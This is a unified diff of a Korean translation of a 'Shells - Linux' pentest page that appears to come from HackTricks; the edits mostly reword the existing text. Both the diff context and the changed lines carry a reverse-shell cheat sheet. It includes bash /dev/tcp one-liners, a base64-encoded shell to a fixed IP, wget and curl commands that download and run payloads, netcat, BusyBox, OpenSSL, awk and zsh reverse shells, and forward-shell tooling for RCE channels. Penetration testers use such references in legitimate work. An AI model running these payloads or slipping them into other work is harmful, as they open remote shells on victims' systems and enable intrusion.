@@ -1,12 +1,14 @@
 # Shells - Linux
 
-**이러한 shell에 대해 질문이 있다면** [**https://explainshell.com/**](https://explainshell.com/)**에서 확인할 수 있습니다.**<sup>[[9]](#references)</sup>
+{{#include ../../banners/hacktricks-training.md}}
+
+**이러한 Shells에 대해 궁금한 점이 있다면** [**https://explainshell.com/**](https://explainshell.com/)**에서 확인할 수 있습니다.**<sup>[[9]](#references)</sup>
 
 ## Full TTY
 
-**reverse shell을 획득한 후**[ **full TTY를 얻으려면 이 페이지를 읽으십시오**](full-ttys.md)**.**
+**reverse shell을 얻은 후에는**[ **이 페이지를 읽고 full TTY를 획득하세요**](full-ttys.md)**.**
 
-아래에 수집된 기본 reverse-shell payload는 HighOn.Coffee 및 PayloadsAllTheThings cheat sheet에도 문서화되어 있습니다. 하나를 선택하기 전에 대상에서 해당 interpreter와 utility를 사용할 수 있는지 확인하십시오.<sup>[[1]](#references)[[4]](#references)</sup>
+아래에 수집된 기본 reverse-shell payloads는 HighOn.Coffee 및 PayloadsAllTheThings cheat sheets에도 문서화되어 있습니다. 하나를 선택하기 전에 대상에서 해당 interpreter와 utility를 사용할 수 있는지 확인하세요.<sup>[[1]](#references)[[4]](#references)</sup>
 
 ## Bash | sh
 ```bash
@@ -36,11 +38,11 @@ echo bm9odXAgYmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC44LjQuMTg1LzQ0NDQgMD4mMSc
 
 다음 항목은 Bash의 문서화된 interactive 및 redirection 동작을 요약합니다:<sup>[[10]](#references)[[11]](#references)</sup>
 
-1. **`bash -i`**: 이 명령의 일부는 interactive (`-i`) Bash shell을 시작합니다.
-2. **`>&`**: 이 명령의 일부는 **standard output** (`stdout`)과 **standard error** (`stderr`)를 **동일한 대상**으로 **redirecting**하는 축약 표기입니다.
-3. **`/dev/tcp/<ATTACKER-IP>/<PORT>`**: 지정된 IP address 및 port에 대한 **TCP connection을 나타내는** 특수 파일입니다.
-- **output 및 error stream을 이 파일로 redirecting하면**, 이 명령은 사실상 interactive shell session의 output을 attacker의 machine으로 전송합니다.
-4. **`0>&1`**: 이 명령의 일부는 **standard input** (`stdin`)을 **standard output** (`stdout`)과 동일한 대상으로 **redirects**합니다.
+1. **`bash -i`**: 명령의 이 부분은 interactive (`-i`) Bash shell을 시작합니다.
+2. **`>&`**: 명령의 이 부분은 **standard output** (`stdout`)과 **standard error** (`stderr`)를 **동일한 destination**으로 **redirecting**하는 shorthand notation입니다.
+3. **`/dev/tcp/<ATTACKER-IP>/<PORT>`**: 지정된 IP address 및 port로의 **TCP connection을 나타내는** 특수 파일입니다.
+- **output 및 error stream을 이 파일로 redirecting**하면, 명령은 interactive shell session의 output을 공격자의 machine으로 효과적으로 전송합니다.
+4. **`0>&1`**: 명령의 이 부분은 **standard input** (`stdin`)을 **standard output** (`stdout`)과 동일한 destination으로 **redirects**합니다.
 
 ### 파일에 생성하고 실행
 ```bash
@@ -49,11 +51,11 @@ wget http://<IP attacker>/shell.sh -P /tmp; chmod +x /tmp/shell.sh; /tmp/shell.s
 ```
 ## Forward Shell
 
-RCE를 사용할 수 있지만 reverse shell이 firewall, NAT 또는 outbound filtering에 의해 차단된 경우, RCE channel을 통한 forward shell이 반응형 세션을 제공할 수 있습니다.<sup>[[12]](#references)</sup>
+RCE를 사용할 수 있지만 방화벽, NAT 또는 outbound filtering으로 reverse shell이 차단된 경우, RCE channel을 통한 forward shell이 semi-interactive session을 제공할 수 있습니다.<sup>[[12]](#references)</sup>
 
 이 목적에 권장되는 tool은 [toboggan](https://github.com/n3rada/toboggan.git)이며, command-execution primitive를 interactive session으로 래핑합니다.<sup>[[12]](#references)</sup>
 
-toboggan을 사용하려면 대상 시스템의 RCE context에 맞춘 Python module을 생성해야 합니다. 이 module interface는 `execute(command, timeout)` function을 요구하며, 이 function은 command output을 반환합니다.<sup>[[12]](#references)</sup> 예를 들어 `nix.py`라는 module은 다음과 같은 구조로 작성할 수 있습니다:
+toboggan을 사용하려면 대상 시스템의 RCE context에 맞춘 Python module을 생성해야 합니다. 이 module interface는 `execute(command, timeout)` function을 필요로 하며, 해당 function은 command output을 반환해야 합니다.<sup>[[12]](#references)</sup> 예를 들어 `nix.py`라는 module은 다음과 같은 구조로 작성할 수 있습니다:
 ```python3
 import jwt
 import httpx
@@ -81,17 +83,17 @@ toboggan의 현재 command-line 형식으로 module을 실행합니다:<sup>[[12
 ```shell
 toboggan nix.py
 ```
-이렇게 하면 interactive session이 시작됩니다. 기본 제공되는 Burp Suite backend를 사용하려면 `toboggan --request burp_request.xml`을 사용하고, command-wrapper backend를 사용하려면 `toboggan --exec-wrapper '<command_template>'`을 사용합니다.<sup>[[12]](#references)</sup>
+이렇게 interactive session이 시작됩니다. 기본 제공되는 Burp Suite backend를 사용하려면 `toboggan --request burp_request.xml`을 사용하고, command-wrapper backend를 사용하려면 `toboggan --exec-wrapper '<command_template>'`을 사용합니다.<sup>[[12]](#references)</sup>
 
-또 다른 방법으로는 `IppSec`의 forward-shell 구현 [**https://github.com/IppSec/forward-shell**](https://github.com/IppSec/forward-shell)을 사용할 수 있습니다.<sup>[[13]](#references)</sup>
+또 다른 방법으로 `IppSec` forward-shell 구현 [**https://github.com/IppSec/forward-shell**](https://github.com/IppSec/forward-shell)을 사용할 수 있습니다.<sup>[[13]](#references)</sup>
 
-다음 항목을 수정해야 합니다.<sup>[[13]](#references)</sup>
+다음 부분을 수정해야 합니다:<sup>[[13]](#references)</sup>
 
 - 취약한 호스트의 URL
-- payload의 prefix와 suffix(있는 경우)
-- payload를 전송하는 방식(headers? data? 추가 정보?)
+- payload의 prefix와 suffix (있는 경우)
+- payload를 전송하는 방식 (headers? data? 추가 정보?)
 
-그런 다음 **commands를 전송**하거나 **`upgrade` command**를 사용해 full PTY를 얻을 수 있습니다. 이 구현은 약 1.3초 간격으로 output을 polling합니다.<sup>[[13]](#references)</sup>
+그런 다음 **send commands**하거나 **`upgrade` command**를 사용해 full PTY를 얻을 수 있습니다. 이 구현은 약 1.3초 간격으로 output을 polling합니다.<sup>[[13]](#references)</sup>
 
 ## Netcat
 ```bash
@@ -103,19 +105,19 @@ rm -f /tmp/bkpipe;mknod /tmp/bkpipe p;/bin/sh 0</tmp/bkpipe | nc <ATTACKER-IP> <
 ```
 ## BusyBox
 
-BusyBox는 여러 유틸리티를 하나의 작은 실행 파일로 통합하며, 소형 또는 임베디드 Linux 시스템에서 흔히 사용됩니다. 독립 실행형 `nc`가 없다면 BusyBox에서 이를 제공하는지 확인하세요:<sup>[[8]](#references)[[19]](#references)</sup>
+BusyBox는 여러 유틸리티를 하나의 작은 실행 파일로 결합하며, 소형 또는 임베디드 Linux 시스템에서 흔히 사용됩니다. 독립 실행형 `nc`가 없다면 BusyBox에서 이를 제공하는지 확인하세요:<sup>[[8]](#references)[[19]](#references)</sup>
 ```bash
 busybox --list-full | grep -E '(^|/)nc$'
 busybox nc <ATTACKER-IP> <PORT> -e /bin/sh
 busybox nc <ATTACKER-IP> <PORT> -e sh
 ```
-`busybox nc`가 존재하지만 interactive execution이 불안정하다면, `nc` 섹션의 FIFO 패턴을 해당 applet에 맞게 조정하세요:<sup>[[2]](#references)[[8]](#references)</sup>
+`busybox nc`가 존재하지만 interactive 실행이 불안정한 경우, `nc` 섹션의 FIFO 패턴을 해당 applet에 맞게 적용하세요:<sup>[[2]](#references)[[8]](#references)</sup>
 ```bash
 rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|busybox nc <ATTACKER-IP> <PORT> >/tmp/f
 ```
 ## gsocket
 
-[https://www.gsocket.io/deploy/](https://www.gsocket.io/deploy/)의 공식 배포 지침을 확인하세요.<sup>[[14]](#references)</sup>
+[https://www.gsocket.io/deploy/](https://www.gsocket.io/deploy/)의 공식 deployment 지침을 확인하세요.<sup>[[14]](#references)</sup>
 ```bash
 bash -c "$(curl -fsSL gsocket.io/x)"
 ```
@@ -132,7 +134,7 @@ rm -f /tmp/bkpipe;mknod /tmp/bkpipe p;/bin/sh 0</tmp/bkpipe | telnet <ATTACKER-I
 ```bash
 while true; do nc -l <port>; done
 ```
-Whois 섹션에 설명된 것과 동일한 Enter/CTRL+D 입력 시퀀스를 사용합니다.<sup>[[3]](#references)</sup>
+Whois 섹션에서 설명한 것과 동일한 Enter/CTRL+D 입력 시퀀스를 사용합니다.<sup>[[3]](#references)</sup>
 
 **피해자**
 ```bash
@@ -240,7 +242,7 @@ zsh -c 'zmodload zsh/net/tcp; ztcp <ATTACKER-IP> <PORT>; zsh -i <&$REPLY >&$REPL
 ```
 ## Rustcat (rcat)
 
-[https://github.com/robiot/rustcat](https://github.com/robiot/rustcat) – Rust로 작성된 modern netcat-like listener.<sup>[[5]](#references)</sup>
+[https://github.com/robiot/rustcat](https://github.com/robiot/rustcat) – Rust로 작성된 modern netcat-like listener입니다.<sup>[[5]](#references)</sup>
 ```bash
 # Attacker – interactive listener with history & tab-completion
 rcat listen -ib 55600
@@ -251,12 +253,12 @@ curl -L https://github.com/robiot/rustcat/releases/download/v3.0.0/rcat-v3.0.0-l
 && /tmp/rcat connect -s /bin/bash <ATTACKER-IP> 55600
 ```
 프로젝트에 문서화된 기능은 다음과 같습니다:<sup>[[5]](#references)</sup>
-- interactive mode에서 command history 및 tab completion
+- interactive mode에서 Command history 및 tab completion
 - `connect`에서 사용할 shell executable을 선택하는 `-s`
 
 ## pwncat-cs
 
-이미 **any raw reverse shell**을 보유하고 있지만 더 사용하기 쉬운 session을 설정할 수 있는 listener가 필요한 경우, `pwncat-cs`가 connection을 처리하고 remote PTY를 시도할 수 있습니다.<sup>[[7]](#references)</sup>
+이미 **raw reverse shell**이 있지만 더 사용하기 편한 세션을 설정할 수 있는 listener가 필요한 경우, `pwncat-cs`가 연결을 처리하고 remote PTY를 시도할 수 있습니다.<sup>[[7]](#references)</sup>
 ```bash
 # Attacker - catch a plain reverse shell and auto-upgrade it when possible
 python3 -m pip install --user pwncat-cs
@@ -265,11 +267,11 @@ pwncat-cs -lp 4444
 # Victim - reuse any payload from this page
 bash -c 'bash -i >& /dev/tcp/<ATTACKER-IP>/4444 0>&1'
 ```
-또한 **암호화된** `ssl-bind` 및 `ssl-connect` 채널을 지원하므로, 전송 암호화가 필요한 경우 `ncat --ssl` 또는 `socat OPENSSL:` payload와 함께 사용할 수 있습니다.<sup>[[7]](#references)</sup>
+또한 **암호화된** `ssl-bind` 및 `ssl-connect` 채널을 지원하므로, 전송 암호화가 필요할 때 `ncat --ssl` 또는 `socat OPENSSL:` payloads와 함께 사용할 수 있습니다.<sup>[[7]](#references)</sup>
 
-## revsh (암호화 및 pivot-ready)
+## revsh (암호화 및 피벗 지원)
 
-`revsh`는 **암호화된 Diffie-Hellman tunnel**을 통해 full TTY를 제공하는 소형 C client/server이며, reverse VPN과 유사한 pivoting을 위해 선택적으로 **TUN/TAP** interface를 연결할 수 있습니다.<sup>[[6]](#references)</sup>
+`revsh`는 **암호화된 Diffie-Hellman tunnel**을 통해 완전한 TTY를 제공하며, reverse VPN과 유사한 pivoting을 위해 **TUN/TAP** 인터페이스를 선택적으로 연결할 수 있는 소형 C client/server입니다.<sup>[[6]](#references)</sup>
 ```bash
 # Build after preparing the OpenSSL dependency as described in the repository README
 git clone https://github.com/emptymonkey/revsh && cd revsh && make
@@ -280,18 +282,18 @@ revsh -c 0.0.0.0:443
 # Victim – reverse shell over the encrypted tunnel
 ./revsh <ATTACKER-IP>:443
 ```
-`revsh`에 문서화된 유용한 flags:<sup>[[6]](#references)</sup>
-- `-b`: bind-shell mode (양쪽에서 활성화)
+`revsh`에 문서화된 유용한 플래그는 다음과 같습니다:<sup>[[6]](#references)</sup>
+- `-b`: bind-shell 모드 (양쪽에서 활성화)
 - `-D [LHOST:]LPORT` 또는 `-B [RHOST:]RPORT`: dynamic SOCKS 4/4a/5 forwarding
-- `-x`: default TUN/TAP setup을 포함한 proxies의 automatic setup 비활성화
+- `-x`: 기본 TUN/TAP 설정을 포함하여 proxies의 자동 설정 비활성화
 
-encrypted tunnel은 shell traffic이 plaintext로 노출되는 것을 방지하지만, 그 자체로 network policy를 우회하지는 않습니다.<sup>[[6]](#references)</sup>
+암호화된 터널은 shell traffic이 plaintext로 노출되는 것을 방지하지만, 그 자체로 network policy를 우회하지는 않습니다.<sup>[[6]](#references)</sup>
 
 ## OpenSSL
 
-이 section에서는 OpenSSL의 `req`, `s_server`, `s_client` commands를 사용하여 certificate를 생성하고 TLS를 통해 shell을 전달합니다.<sup>[[15]](#references)[[16]](#references)[[17]](#references)</sup>
+이 섹션에서는 OpenSSL의 `req`, `s_server`, `s_client` 명령을 사용하여 certificate를 생성하고 TLS를 통해 shell을 전달합니다.<sup>[[15]](#references)[[16]](#references)[[17]](#references)</sup>
 
-The Attacker (Kali)
+공격자 (Kali)
 ```bash
 openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes #Generate certificate
 openssl s_server -quiet -key key.pem -cert cert.pem -port <l_port>
@@ -304,7 +306,7 @@ mkfifo /tmp/.s; /bin/sh -i </tmp/.s 2>&1 | openssl s_client -quiet -connect <ATT
 #If the target needs SNI / hostname validation to blend with a fronted TLS service
 mkfifo /tmp/.s; /bin/sh -i </tmp/.s 2>&1 | openssl s_client -quiet -servername <DOMAIN> -verify_return_error -verify_hostname <DOMAIN> -connect <ATTACKER_IP>:<PORT> >/tmp/.s; rm /tmp/.s
 ```
-입력/출력 채널을 분리하고 싶을 때는 고전적인 **two-listener** 패턴을 여전히 사용할 수 있습니다.<sup>[[16]](#references)[[17]](#references)</sup>
+분리된 입력/출력 채널이 필요할 때는 여전히 고전적인 **two-listener** 패턴을 사용할 수 있습니다.<sup>[[16]](#references)[[17]](#references)</sup>
 ```bash
 #Linux
 openssl s_client -quiet -connect <ATTACKER_IP>:<PORT1>|/bin/bash|openssl s_client -quiet -connect <ATTACKER_IP>:<PORT2>
@@ -336,7 +338,7 @@ awk 'BEGIN {s = "/inet/tcp/0/<IP>/<PORT>"; while(42) { do{ printf "shell>" |& s;
 ```bash
 while true; do nc -l 79; done
 ```
-명령을 보내려면 명령을 입력하고 Enter를 누른 다음 CTRL+D를 누르세요(STDIN을 중지하려면).<sup>[[3]](#references)</sup>
+명령을 보내려면 명령을 입력하고 Enter를 누른 다음 CTRL+D를 누르세요(STDIN을 중지하기 위해).<sup>[[3]](#references)</sup>
 
 **피해자**
 ```bash
@@ -369,11 +371,11 @@ close(Service)
 ```
 ## Xterm
 
-시스템의 6001번 포트에 연결을 시도합니다.<sup>[[2]](#references)</sup>
+이는 포트 6001에서 시스템에 연결을 시도합니다.<sup>[[2]](#references)</sup>
 ```bash
 xterm -display 10.0.0.1:1
 ```
-reverse shell을 수신하려면 아래와 같이 포트 6001에서 수신 대기 중인 X server를 사용합니다.<sup>[[2]](#references)</sup>
+reverse shell을 수신하려면 아래와 같이 6001번 포트에서 수신 대기 중인 X server를 사용합니다.<sup>[[2]](#references)</sup>
 ```bash
 # Authorize host
 xhost +targetip
@@ -393,18 +395,18 @@ Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new
 
 - [1] [Reverse Shell Cheat Sheet: PHP, ASP, Netcat, Bash & Python](https://highon.coffee/blog/reverse-shell-cheat-sheet/)
 - [2] [Reverse Shell Cheat Sheet](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)
-- [3] [Whois와 Finger를 Reverse Shell에 사용하기](https://tcm1911.github.io/posts/whois-and-finger-reverse-shell/)
+- [3] [Whois와 Finger를 사용한 Reverse Shell](https://tcm1911.github.io/posts/whois-and-finger-reverse-shell/)
 - [4] [PayloadsAllTheThings - Reverse Shell Cheatsheet](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)
-- [5] [rustcat - 최신 포트 리스너 및 Reverse Shell](https://github.com/robiot/rustcat)
-- [6] [revsh - 터미널 지원, 데이터 터널링 및 고급 피벗 기능을 갖춘 Reverse Shell](https://github.com/emptymonkey/revsh)
+- [5] [rustcat - 최신 포트 listener 및 reverse shell](https://github.com/robiot/rustcat)
+- [6] [revsh - terminal 지원, data tunneling 및 advanced pivoting capabilities를 갖춘 reverse shell](https://github.com/emptymonkey/revsh)
 - [7] [pwncat (pwncat-cs) - post-exploitation 플랫폼](https://github.com/calebstewart/pwncat)
 - [8] [busybox | GTFOBins](https://gtfobins.org/gtfobins/busybox/)
 - [9] [explainshell.com](https://explainshell.com/)
-- [10] [Bash Reference Manual: 리디렉션](https://www.gnu.org/s/bash/manual/html_node/Redirections.html)
-- [11] [Bash Reference Manual: Bash 호출](https://www.gnu.org/software/bash/manual/html_node/Invoking-Bash.html)
+- [10] [Bash Reference Manual: Redirections](https://www.gnu.org/s/bash/manual/html_node/Redirections.html)
+- [11] [Bash Reference Manual: Invoking Bash](https://www.gnu.org/software/bash/manual/html_node/Invoking-Bash.html)
 - [12] [toboggan](https://github.com/n3rada/toboggan)
 - [13] [forward-shell](https://github.com/IppSec/forward-shell)
-- [14] [Global Socket 배포 지침](https://www.gsocket.io/deploy/)
+- [14] [Global Socket 배포 instructions](https://www.gsocket.io/deploy/)
 - [15] [openssl-req](https://docs.openssl.org/4.0/man1/openssl-req/)
 - [16] [openssl-s_server](https://docs.openssl.org/master/man1/openssl-s_server/)
 - [17] [openssl-s_client](https://docs.openssl.org/master/man1/openssl-s_client/)
